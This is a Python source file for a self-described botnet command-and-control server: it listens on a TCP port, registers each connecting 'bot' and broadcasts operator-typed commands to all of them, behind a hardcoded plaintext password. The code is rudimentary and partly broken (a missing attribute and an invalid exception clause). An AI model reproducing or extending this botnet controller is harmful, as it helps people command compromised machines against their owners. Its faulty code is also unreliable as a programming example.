import socket
import sys
import threading

clients = []

def send_to_all_clients(msg):
        for client in clients :
            try:
                client.connection.send(msg)
            except:
                continue

class Client(threading.Thread):
    def __init__(self, ip, port, connection):
        threading.Thread.__init__(self)
        self.connection = connection
        self.ip = ip
        self.port = port
    def run(self):
        while True:
            message = input('> ')
            send_to_all_clients(message.encode())
        self.connection.close()
            
    


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.address = (self.ip, self.port)
        self.server = None
        
        print("Initializing Server...")
        print("Server configured on " + str(self.ip) + ":" + str(self.port))
        print("Waiting for Botnet Clients...")

    

    def send_to_client(self, ip, port, msg):
        for client in self.clients :
            if client.ip == ip and client.port == port :
                client.connection.send(msg)
        

    def open_socket(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind(self.address)
        except(socket.error, e):
            if self.server:
                self.server.close()
            sys.exit(1)

    def run(self):
        self.open_socket()
        self.server.listen(5)

        while True :
            connection, (ip, port) = self.server.accept()
            print("\nA Bot Added. Standby for orders.")
            c = Client(ip, port, connection)
            
            clients.append(c)
            c.start()

        self.server.close()

if __name__ == '__main__':
    print("\n\t******************** BOTNET SERVER ********************\n")
    print("\n\n\t -----Authentication-----\n\n")
    pwd = input("\tPassword:")
    if(pwd == "sneha"):
        s = Server('127.0.0.1', 6666)
        s.run()
    else:
        print("Invalid Credentials. Please try again.")